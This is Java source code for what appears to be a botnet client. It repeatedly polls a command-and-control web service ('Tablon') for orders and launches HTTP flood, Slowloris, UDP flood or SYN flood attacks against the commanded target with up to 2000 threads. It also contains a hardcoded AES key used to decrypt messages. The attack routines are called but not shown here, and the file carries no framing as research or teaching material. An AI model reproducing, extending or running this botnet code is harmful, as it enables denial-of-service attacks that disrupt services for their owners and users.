import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.UnknownHostException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.LinkedList;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.ShortBufferException;
import javax.crypto.spec.SecretKeySpec;

import org.apache.axiom.om.OMAbstractFactory;
import org.apache.axiom.om.OMElement;
import org.apache.axiom.om.OMFactory;
import org.apache.axiom.om.OMNamespace;
import org.apache.axis2.AxisFault;
import org.apache.axis2.addressing.EndpointReference;
import org.apache.axis2.client.Options;
import org.apache.axis2.client.ServiceClient;
import org.apache.axis2.context.ConfigurationContext;
import org.apache.axis2.context.ConfigurationContextFactory;
import org.apache.axis2.transport.http.HTTPConstants;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
import org.apache.commons.httpclient.params.HttpConnectionManagerParams;

public class Bot {

	private static final String ERROR = "error";
	private static final String REST = "rest";
	private static final String CODIF = "ISO-8859-1";
	private static final long T_MAX = 12000; 
	private static final String HTTPFLOOD = "http";
	private static final String SLOWLORIS = "slow";
	private static final String UDPFLOOD = "udp";
	private static final String TCPFLOOD = "tcp";
	
	private static final int THREADS = 2000;

	private static OMFactory omFactory = OMAbstractFactory.getOMFactory();
	private static OMNamespace omNameSpace = omFactory.createOMNamespace("http://ws.apache.org/axis2", "nsTablon");
	private static Options options = new Options();
	private static String urlTablon = "http://192.168.0.13:7090/axis2/services/Tablon/";
	
	
	public static void main(String[] args) {
		boolean actuar = false;
		Comando comando = null;
		LinkedList<Comando> ejecutados = new LinkedList<Comando>();
		
		while (!actuar) {
			ejecutados = actualizarEjecutados(ejecutados);
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			comando = getComando();
			if (comando != null && (!comando.getAtaque().equals(REST) || comando.getAtaque().equals(""))) {
				if(!ejecutados.contains(comando)){
					System.out.println(comando);
					atacar(comando);
					ejecutados.add(comando);

				}
			}
		}

	}
	
	public static Comando getComando(){
		System.out.println("buscando ordenes");
		
		Comando comando = null;
		ServiceClient cliente = null;
		try {
			cliente = new ServiceClient();
		} catch (AxisFault e) {
			e.printStackTrace();
		}
		
		options.setTo(new EndpointReference(urlTablon));
		options.setAction("urn:getComando");
		options.activate(getConf());

		cliente.setOptions(options);
		
		OMElement metodo = omFactory.createOMElement("getComando", omNameSpace);
		OMElement respuesta = null;
		try {
			respuesta = cliente.sendReceive(metodo);
		} catch (AxisFault e) {
			System.out.println("ups...");
			e.printStackTrace();
		}
		
		OMElement elem = respuesta.getFirstElement();
		try {
			comando = new Comando(elem.getText());
		} catch (NumberFormatException | MalformedURLException | ArrayIndexOutOfBoundsException e) {
			e.printStackTrace();
			return new Comando("", null, 0);
		}
		
		return comando;
	}
	
	
	private static boolean atacar(Comando comando){
		switch(comando.getAtaque()){
		case HTTPFLOOD:
			Ataque.httpFlood(comando);
			break;
		case SLOWLORIS:
			try {
				Ataque.slowlorisFlood(comando, THREADS);
			} catch (UnknownHostException e) {
				e.printStackTrace();
				return false;
			}
		case UDPFLOOD:
			try {
				Ataque.UDPFlood(comando);
			} catch (IOException e) {
				e.printStackTrace();
				return false;
			}
		case TCPFLOOD:
			try {
				Ataque.SYNFlood(comando, THREADS);
			} catch (UnknownHostException e) {
				e.printStackTrace();
				return false;
			}
		default:
			break;
		}
		return true;
	}

	
	
	public static LinkedList<Comando> actualizarEjecutados(LinkedList<Comando> ejecutados){
		long current = System.currentTimeMillis();
		LinkedList<Comando> actualizada = new LinkedList<Comando>();
		for(Comando c : ejecutados){
			long dif = current - c.getDuracion();
			if(dif < T_MAX){
				actualizada.add(c);
			}			
		}
		return actualizada;
		
	}
	
	
	
	public static String desencriptar(String cText, int cLen){
		Cipher cipher = null;
		byte[] plainText = new byte[cLen];
		SecretKeySpec sKey = null;
		byte[] pkey;
		try {
			pkey = "keykeykekeykeykekeykeykekeykeyke".getBytes("UTF-8");
		
		sKey = new SecretKeySpec(pkey, "AES");
		cipher = Cipher.getInstance("AES/ECB/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, sKey);
		byte[] encoded = cText.getBytes("ISO-8859-1");
		int plen = cipher.update(encoded, 0, cLen, plainText, 0);
		plen += cipher.doFinal(plainText, plen);
		
		plainText = unPad(plainText);
		
		System.out.println(" obtenida --> " + new String(plainText));
		return new String(plainText);
		
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			return ERROR;
			
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
			return ERROR;

		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
			return ERROR;
			
		} catch (IllegalBlockSizeException e) {
			e.printStackTrace();
			return ERROR;
			
		} catch (ShortBufferException e) {
			e.printStackTrace();
			return ERROR;
			
		} catch (BadPaddingException e) {
			e.printStackTrace();
			return ERROR;
			
		} catch (InvalidKeyException e) {
			e.printStackTrace();
			return ERROR;
			
		}
	}
	
	
	
	private static byte[] unPad(byte[] bytes){

		int cont = 0;
		for(int i = 0; i < bytes.length; i++){
			if(bytes[i] == (byte) -0x80){
				cont ++;
			}
		}
		byte[] unpadded = new byte[bytes.length + cont];
		
		for(int i = 0; i < bytes.length; i++){
			if(bytes[i] != (byte) -0x80){
				unpadded[i] = bytes[i];
			}
		}
		
		return unpadded;
		
	}
	
	private static ConfigurationContext getConf() {

		ConfigurationContext configurationContext = null;
		try {
			configurationContext = ConfigurationContextFactory.createConfigurationContextFromFileSystem(null, null);
		} catch (AxisFault e) {
			e.printStackTrace();
		}

		MultiThreadedHttpConnectionManager multiThreadedHttpConnectionManager = new MultiThreadedHttpConnectionManager();

		HttpConnectionManagerParams params = new HttpConnectionManagerParams();

		// establecer máximo de conexiones en la pool
		params.setDefaultMaxConnectionsPerHost(20);
		multiThreadedHttpConnectionManager.setParams(params);
		HttpClient httpClient = new HttpClient(multiThreadedHttpConnectionManager);
		configurationContext.setProperty(HTTPConstants.CACHED_HTTP_CLIENT, httpClient);
		return configurationContext;
	}

	
}